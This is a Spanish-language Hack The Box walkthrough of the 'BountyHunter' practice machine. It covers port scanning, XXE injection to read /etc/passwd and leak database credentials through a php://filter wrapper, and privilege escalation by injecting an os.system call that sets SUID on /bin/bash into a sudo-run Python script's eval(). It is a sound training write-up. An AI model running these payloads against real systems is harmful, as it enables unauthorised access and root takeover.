---
layout: single
title: Bounty Hunter - Hack The Box
excerpt: "Esta es una máquina un poco más dificil que las anteriores, siendo que para poder entrar a la página usaremos BurpSuite para obtener las credenciales, una vez dentro nos aprovecharemos de los permisos sobre un script en Python para poder ganar acceso a la máquina víctima, aquí el análisis de código es vital y de suma importancia, pues debemos saber algo de Python y desarrollo web o al menos entender lo que hacen ciertas partes de la máquina."
date: 2023-01-20
classes: wide
header:
  teaser: /assets/images/htb-writeup-bountyhunter/bounty_logo.png
  teaser_home_page: true
  icon: /assets/images/hackthebox.webp
categories:
  - HackTheBox
  - Easy Machine
tags:
  - Linux
  - BurpSuite
  - XXE Injection
  - Python Vulnerability
  - SUDO Exploitation
  - OSCP Style
---
![](/assets/images/htb-writeup-bountyhunter/bounty_logo.png)

Esta es una máquina un poco más dificil que las anteriores, siendo que para poder entrar a la página, usaremos **BurpSuite** para obtener las credenciales, una vez dentro, nos aprovecharemos de los permisos sobre un script en Python para poder ganar acceso a la máquina víctima, aquí el análisis del código es vital y de suma importancia, pues debemos saber algo de Python y desarrollo web o al menos entender lo que hacen ciertas partes de la máquina.

**NOTA:** La verdad en esta máquina me quedé atorado bastante tiempo, por lo que tuve que recurrir a algunos tutoriales sobre cómo resolverla pues después de analizar la página no sabia bien cómo usar **BurpSuite**. Asi que logre solucionarla gracias a **S4vitar** e **IppSec**, grandes maestros de la ciberseguridad. Aqui dejo sus canales de YouTube:
* Canal de IppSec: https://www.youtube.com/@ippsec
* Canal de S4vitar: https://www.youtube.com/@s4vitar

# Recopilación de Información
## Traza ICMP
Veamos si la máquina está conectada, además vamos a analizar el TTL para saber que Sistema Operativo usa:
```
ping -c 4 10.10.11.100            
PING 10.10.11.100 (10.10.11.100) 56(84) bytes of data.
64 bytes from 10.10.11.100: icmp_seq=1 ttl=63 time=133 ms
64 bytes from 10.10.11.100: icmp_seq=2 ttl=63 time=132 ms
64 bytes from 10.10.11.100: icmp_seq=3 ttl=63 time=132 ms
64 bytes from 10.10.11.100: icmp_seq=4 ttl=63 time=134 ms

--- 10.10.11.100 ping statistics ---
4 packets transmitted, 4 received, 0% packet loss, time 2999ms
rtt min/avg/max/mdev = 131.889/132.734/133.827/0.714 ms
```
Por el TTL vemos que la máquina usa Linux. Ahora vamos a hacer un escaneo de puertos.

## Escaneo de Puertos
Veamos que puertos estan abiertos:
```
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.11.100 -oG allPorts            
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.93 ( https://nmap.org ) at 2023-01-20 11:12 CST
Initiating SYN Stealth Scan at 11:12
Scanning 10.10.11.100 [65535 ports]
Discovered open port 22/tcp on 10.10.11.100
Discovered open port 80/tcp on 10.10.11.100
Completed SYN Stealth Scan at 11:13, 23.57s elapsed (65535 total ports)
Nmap scan report for 10.10.11.100
Host is up, received user-set (0.43s latency).
Scanned at 2023-01-20 11:12:45 CST for 23s
Not shown: 33862 closed tcp ports (reset), 31671 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 63
80/tcp open  http    syn-ack ttl 63

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 23.66 seconds
           Raw packets sent: 115632 (5.088MB) | Rcvd: 34152 (1.366MB)
```
* -p-: Para indicarle un escaneo en ciertos puertos.
* --open: Para indicar que aplique el escaneo en los puertos abiertos.
* -sS: Para indicar un TCP SYN port Scan para que nos agilice el escaneo.
* --min-rate: Para indicar una cantidad de envio de paquetes de datos no menor a la que indiquemos (en nuestro caso pedimos 5000).
* -vvv: Para indicar un triple verbose, un verbose nos muestra lo que vaya obteniendo el escaneo.
* -n: Para indicar que no se aplique resolución dns para agilizar el escaneo.
* -Pn: Para indicar que se omita el descubrimiento de hosts.
* -oG: Para indicar que el output se guarde en un fichero grepeable. Lo nombre allPorts.

Solamente hay dos puertos abiertos, uno con SSH y otro con web abierto. Realicemos un escaneo de servicios, a ver cuáles son.

## Escaneo de Servicios
```
nmap -sC -sV -p22,80 10.10.11.100 -oN targeted                               
Starting Nmap 7.93 ( https://nmap.org ) at 2023-01-20 11:18 CST
Nmap scan report for 10.10.11.100
Host is up (0.13s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 d44cf5799a79a3b0f1662552c9531fe1 (RSA)
|   256 a21e67618d2f7a37a7ba3b5108e889a6 (ECDSA)
|_  256 a57516d96958504a14117a42c1b62344 (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Bounty Hunters
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 12.39 seconds
```
* -sC: Para indicar un lanzamiento de scripts basicos de reconocimiento.
* -sV: Para identificar los servicios/version que estan activos en los puertos que se analicen.
* -p: Para indicar puertos especificos.
* -oN: Para indicar que el output se guarde en un fichero. Lo llame targeted.

De momento no tenemos credeciales para logearnos en SSH, vamos a revisar la pagina web que esta en el puerto 80.

# Análisis de Vulnerabilidades
## Analizando Puerto 80
Viendo todos los botones interactivos de la página, algunos no funcionan y otros no sabemos que hacen, con excepción del que dice **Portal**, una vez le demos click nos redirige a una subpágina:

![](/assets/images/htb-writeup-bountyhunter/Captura1.png)

Al parecer esta sección no está completa y nos pide ir a otra subpágina, vamos a ver que hay.

![](/assets/images/htb-writeup-bountyhunter/Captura2.png)

Una vez dentro, quizá podamos tratar de inyectar código, probemos utilizando la herramienta **BurpSuite** y nos vamos a utilizar la siguiente página como guía del XXE Injection (XML external entity): 
* https://portswigger.net/web-security/xxe

![](/assets/images/htb-writeup-bountyhunter/Captura3.png)

Pero ¿qué es XXE Injection? Bueno esto es:

**Es una vulnerabilidad de seguridad web que permite a un atacante interferir con el procesamiento de datos XML de una aplicación. A menudo, permite que un atacante vea archivos en el sistema de archivos del servidor de aplicaciones e interactúe con cualquier sistema externo o de back-end al que pueda acceder la propia aplicación.**

Todo esto viene explicado en la página web guía de **BurpSuite**

## BurpSuite
Antes de continuar debemos configurar algunas cosas para que **BurpSuite** vaya sin problemas:
* Instala en el navegador la herramienta **FoxyProxy**

* Una vez instalado, ve a la sección **Add** para agregar un proxy que usara **BurpSuite**.

![](/assets/images/htb-writeup-bountyhunter/Captura4.png)

* Configúralo como la siguiente imagen:

![](/assets/images/htb-writeup-bountyhunter/Captura5.png)

Esto lo hacemos porque **BurpSuite** tiene un proxy configurado por defecto:

![](/assets/images/htb-writeup-bountyhunter/Captura7.png)

* Una vez configurado, ya debería aparecer cuando des click en el **FoxyProxy**

![](/assets/images/htb-writeup-bountyhunter/Captura6.png)

* Instala el certificado CA en tu navegador, es posible que **BurpSuite** automáticamente te lo pida y te dé pasos a seguir, si usas **FireFox** aquí estan los pasos: https://portswigger.net/burp/documentation/desktop/external-browser-config/certificate/ca-cert-firefox

* Activa la intercepción en **BurpSuite** y activa el **FoxyProxy**.

Ahora sí, ya estamos listos para trabajar.

# Explotación de Vulnerabilidades
En la última subpágina, llena los campos con lo que quieras y dale **submit** para que **BurpSuite** pueda interceptar la petición, ósea que debemos obtener un POST, que será con el que vamos a seguir trabajando:

![](/assets/images/htb-writeup-bountyhunter/Captura8.png)

![](/assets/images/htb-writeup-bountyhunter/Captura9.png)

Una vez obtenido, vamos a mandar todo a la sección **Repeater**:

![](/assets/images/htb-writeup-bountyhunter/Captura10.png)

![](/assets/images/htb-writeup-bountyhunter/Captura11.png)

Y del **Repeater** vamos a mandar la data al **Decoder**:

![](/assets/images/htb-writeup-bountyhunter/Captura12.png)

![](/assets/images/htb-writeup-bountyhunter/Captura13.png)

Ya en el **Decoder** lo que haremos será convertir la data que viene hasta abajo a base64:

![](/assets/images/htb-writeup-bountyhunter/Captura14.png)

Bien, según la página guía de **BurpSuite**, aquí podemos inyectar código para que nos muestre la carpeta /etc/passwd de la máquina víctima:

![](/assets/images/htb-writeup-bountyhunter/Captura15.png)

Una vez que la data este en base64, lo copiamos, nos vamos al **Repeater**, cambiamos la data por la nueva que acabamos de obtener y enviamos la petición para ver que obtenemos. IMPORTANTE, para que funcione hay que convertir la data a **URL code**, solamente seleccionamos la nueva data y oprimimos **ctrl + u** y ya quedara **URL code**:

![](/assets/images/htb-writeup-bountyhunter/Captura16.png)

Vaya, vaya, al parecer podemos vulnerar la página de esta forma:

![](/assets/images/htb-writeup-bountyhunter/Captura17.png)

Incluso, si analizamos bien lo que nos muestra, en la parte de abajo, podemos ver un usuario llamado **Development**, esto nos puede servir más adelante.
```
Dumper:/:/usr/sbin/nologin
development:x:1000:1000:Development:/home/development:/bin/bash
```
Pero con esta subpágina no podremos hacer mucho. Ahora lo que vamos a hacer es buscar más subpáginas ocultas, es tiempo de hacer **FUZZING**.

## Fuzzing
Para hacer el **fuzzing** usaremos la herramienta **wfuzz**, para usarla debemos indicarle bastantes cosillas:
```
wfuzz -c --hc=404 -t 200 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt http://10.10.11.100/FUZZ.php
 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://10.10.11.100/FUZZ.php
Total requests: 220560

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                      
=====================================================================

000000003:   200        388 L    1470 W     25168 Ch    "# Copyright 2007 James Fisher"                                              
000000001:   200        388 L    1470 W     25168 Ch    "# directory-list-2.3-medium.txt"                                            
000000007:   200        388 L    1470 W     25168 Ch    "# license, visit http://creativecommons.org/licenses/by-sa/3.0/"            
000000015:   200        388 L    1470 W     25168 Ch    "index"                                                                      
000000368:   200        5 L      15 W       125 Ch      "portal"                                                                     
000000008:   200        388 L    1470 W     25168 Ch    "# or send a letter to Creative Commons, 171 Second Street,"                 
000000009:   200        388 L    1470 W     25168 Ch    "# Suite 300, San Francisco, California, 94105, USA."                        
000000006:   200        388 L    1470 W     25168 Ch    "# Attribution-Share Alike 3.0 License. To view a copy of this"              
000000005:   200        388 L    1470 W     25168 Ch    "# This work is licensed under the Creative Commons"                         
000000002:   200        388 L    1470 W     25168 Ch    "#"                                                                          
000000004:   200        388 L    1470 W     25168 Ch    "#"                                                                          
000000848:   200        0 L      0 W        0 Ch        "db"                                                                         
000000014:   403        9 L      28 W       277 Ch      "http://10.10.11.100/.php"                                                   
000000013:   200        388 L    1470 W     25168 Ch    "#"                                                                          
000000012:   200        388 L    1470 W     25168 Ch    "# on atleast 2 different hosts"                                             
000000011:   200        388 L    1470 W     25168 Ch    "# Priority ordered case sensative list, where entries were found"           
000000010:   200        388 L    1470 W     25168 Ch    "#"                                                                          
^C /usr/lib/python3/dist-packages/wfuzz/wfuzz.py:80: UserWarning:Finishing pending requests...

Total time: 18.81724
Processed Requests: 5620
Filtered Requests: 5603
Requests/sec.: 298.6621
```
* -c: Para que nos muestre los resultados con tono colorizado.
* --hc=404: Para ocultar este codigo (hc=hide code), es decir, que no lo muestre en el fuzzing 
* -t 200: Para mandar 200 peticiones para ir más rapido
* -w: Para utilizar un diccionario o worldlist
* /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt: Esta es la ubicación del Worldlist
* http://10.10.11.100/FUZZ.php: Para indicar a donde sera el fuzzing, al final solamente se le agrega FUZZ pero le puedes agregar cosas más especificas, por ejemplo en nuestro caso, vemos que la pagina usa mucho PHP, por lo que agregar .php al final seria bueno para que encuentre subpaginas tipo PHP.

Vemos una subpágina a la que no teniamos acceso llama **db**, vamos a checar de que va dicha subpágina.

![](/assets/images/htb-writeup-bountyhunter/Captura18.png)

Nada, no muestra nada, pero eso quiere decir que si existe y que podemos accesar a ella de alguna manera. Es momento de usar **BurpSuite** otra vez.

Estando en el **Decoder**, podemos indicar en la inyección de código, que podamos ver ciertas páginas dependiendo del **wrapper** que estas usan. Como en este caso se usa PHP, podemos indicarle que nos liste un archivo de PHP en base64 para que nosotros después podamos **deencodear** esa data desde la terminal.
Vámonos por pasos:
* php://filter/convert.base64-encode/: Con este código podemos encodear archivos de php a base64.
* php://filter/convert.base64-encode/resource=db.php: Con resourse le agregamos la subpagina y ya podemos encodearlo
* Una vez más mandamos todo a la data del **Repeater**, lo ponemos como **URL code** y lo mandamos.

![](/assets/images/htb-writeup-bountyhunter/Captura19.png)

![](/assets/images/htb-writeup-bountyhunter/Captura20.png)

Si seleccionamos el resultado que nos arrojó en **BurpSuite**, del lado derecho nos mostrara como se vería sino estuviera en base64:

![](/assets/images/htb-writeup-bountyhunter/Captura21.png)

Ojito, nos da una contraseña, recordemos que ya tenemos un usuario, así que intentemos meternos al SSH que está activo en la máquina para ver si podemos accesar:
```
ssh development@10.10.11.100
development@10.10.11.100's password: 
Welcome to Ubuntu 20.04.2 LTS (GNU/Linux 5.4.0-80-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Fri 20 Jan 2023 08:14:31 PM UTC

  System load:           0.0
  Usage of /:            24.5% of 6.83GB
  Memory usage:          16%
  Swap usage:            0%
  Processes:             214
  Users logged in:       0
  IPv4 address for eth0: 10.10.11.100
  IPv6 address for eth0: dead:beef::250:56ff:feb9:9514


0 updates can be applied immediately.


The list of available updates is more than a week old.
To check for new updates run: sudo apt update

Last login: Wed Jul 21 12:04:13 2021 from 10.10.14.8
development@bountyhunter:~$ 

```
# Post Explotación
¡¡ESTAMOS DENTRO!! Es hora de buscar que nos puede ser útil:
```
development@bountyhunter:~$ ls
contract.txt  user.txt
development@bountyhunter:~$ cat contract.txt 
Hey team,

I'll be out of the office this week but please make sure that our contract with Skytrain Inc gets completed.

This has been our first job since the "rm -rf" incident and we can't mess this up. Whenever one of you gets on please have a look at the internal tool they sent over. There have been a handful of tickets submitted that have been failing validation and I need you to figure out why.

I set up the permissions for you to test this. Good luck.

-- John
```
Ahí podemos ver la flag del usuario y un mensaje...Entonces hay un script en Python que podemos ejecutar con permiso de Sudoers, quizá podamos utilizarlo para convertirnos en root.
```
development@bountyhunter:~$ sudo -l
Matching Defaults entries for development on bountyhunter:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
User development may run the following commands on bountyhunter:
    (root) NOPASSWD: /usr/bin/python3.8 /opt/skytrain_inc/ticketValidator.py
```
Ahí se encuentra el script, y así se usa:
```
development@bountyhunter:~$ sudo -u root python3.8 /opt/skytrain_inc/ticketValidator.py
Please enter the path to the ticket file.
xd
Wrong file type.
```
Es momento de analizar el script en Python.

## Analisis de Script
Vamos a ir deshuesando este script y veremos que hace cada función:
* En esta función lo que se hace es validar que el archivo sea .md
```
Skytrain Inc Ticket Validation System 0.1
Do not distribute this file.
def load_file(loc):

    if loc.endswith(".md"):
        return open(loc, 'r')
    else:
        print("Wrong file type.")
        exit()
```
En la siguiente función se hace la validación del ticket:
```
def evaluate(ticketFile):
    #Evaluates a ticket to check for ireggularities.
    code_line = None
    for i,x in enumerate(ticketFile.readlines()):
        if i == 0:
            if not x.startswith("# Skytrain Inc"):
                return False
            continue
        if i == 1:
            if not x.startswith("## Ticket to "):
                return False
            print(f"Destination: {' '.join(x.strip().split(' ')[3:])}")
            continue
        if x.startswith("__Ticket Code:__"):
            code_line = i+1
            continue
        if code_line and i == code_line:
            if not x.startswith("**"):
                return False
            ticketCode = x.replace("**", "").split("+")[0]
            if int(ticketCode) % 7 == 4:
                validationNumber = eval(x.replace("**", ""))
                if validationNumber > 100:
                    return True
                else:
                    return False
    return False
```
La función lee el ticket, ósea el archivo .md, y debe contener dos cosas principalmente:
* Que el archivo empiece con el siguiente comentario:
```
if not x.startswith("# Skytrain Inc"):
                return False
```
* Que incluya también el siguiente comentario:
```
if not x.startswith("## Ticket to "):
                return False
```
* Y por último dicho ticket debe incluir lo siguiente:
```
if x.startswith("__Ticket Code:__"):
            code_line = i+1
            continue
```
Entonces el ticket quedaría así para que sea valido:
```
# Skytrain Inc
## Ticket to 
__Ticket Code:__
```

Ahora bien, aquí viene la parte en la que medio coco se me quemo porque no entendía bien que hacía. El ticket debe iniciar con lo siguiente:
```
if not x.startswith("**"):
                return False
```
Es decir, que va a validar que empice con dos asteriscos, asi: **

La siguiente parte va a reemplazar los asteriscos por nada, ósea "", va a dividir la cadena de de texto con **.split** en donde tenga un + para quedarse solamente con la parte izquierda del ticket:
```
ticketCode = x.replace("**", "").split("+")[0]
```
Se entiende mejor si lo muestro en código:
```
python3                                                                                                           
Python 3.11.2 (main, Feb 12 2023, 00:48:52) [GCC 12.2.0] on linux
Type "help", "copyright", "credits" or "license" for more information.
>>> x = "** kpdos"
>>> x.replace("**", "")
' kpdos'
>>> x = "** kpdos + cosasxd"
>>> x.replace("**", "").split("+")
[' kpdos ', ' cosasxd']
>>> x.replace("**", "").split("+")[0]
' kpdos '
```
Bien, la siguiente parte va a convertir el código del ticket en número, va a dividir lo que salga entre 7 y el resultado debe dar un residuo de 4:
```
if int(ticketCode) % 7 == 4:
```
Un número que nos sirve será el 11, probémoslo:
```
>>> x = "** 11 + cosasxd"
>>> int(x.replace("**", "").split("+")[0]) % 7
4
```
Entonces si da 4, se hace una evaluación con:
```
validationNumber = eval(x.replace("**", ""))
```
Con eval, si no está bien sanitizado este código, podemos inyectar código pues cuando hace la validación podemos pedirle que nos haga otra cosa aparte:
```
>>> eval("11+69")
80
>>> eval("11+69 and __import__('os').system('whoami')")
root
0
```
¿Y qué pasaria si lo probamos con nuestro ejemplo? Vamos a ver:
```
>>> x = "** 11 + 80 and __import__('os').system('whoami')"
>>> int(x.replace("**", "").split("+")[0]) % 7
4
>>> eval(x.replace("**", ""))
root
0
```
Ufff ahora sabemos cómo inyectar código en la máquina, vamos a crear un archivo en una carpeta, por ejemplo la tmp y agregamos lo que debe llevar el archivo .md:
```
development@bountyhunter:~$ cd /tmp
development@bountyhunter:/tmp$ nano prueba.md
```
Adentro del archivo prueba.md:
```
# Skytrain Inc
## Ticket to 
__Ticket Code:__
** 11 + 2 and __import__('os').system('chmod u+s /bin/bash')
```
El **chmod u+s /bin/bash** es para que podamos iniciar bash como root.

Probamos el script de Python y ya deberíamos poder iniciar un bash como root:
```
development@bountyhunter:/tmp$ sudo -u root python3.8 /opt/skytrain_inc/ticketValidator.py
Please enter the path to the ticket file.
/tmp/prueba.md
Destination: 
Invalid ticket.

```
Comprobamos la bash:
```
development@bountyhunter:/tmp$ ls -l /bin/bash
-rwsr-xr-x 1 root root 1183448 Jun 18  2020 /bin/bash
development@bountyhunter:/tmp$ which bash | xargs ls -l
-rwsr-xr-x 1 root root 1183448 Jun 18  2020 /usr/bin/bash
```
¡Y ya está! Solo debemos iniciar la consola bash para buscar la flag y terminamos.
```
development@bountyhunter:/tmp$ bash -p
bash-5.0# whoami
root
bash-5.0# cd /root
bash-5.0# ls
root.txt  snap
bash-5.0# exit
exit

```
## Links de Investigación
* https://portswigger.net/web-security/xxe
* https://www.youtube.com/watch?v=egcvKwYpi0g
* https://www.youtube.com/watch?v=5axsDhumfhU

# FIN
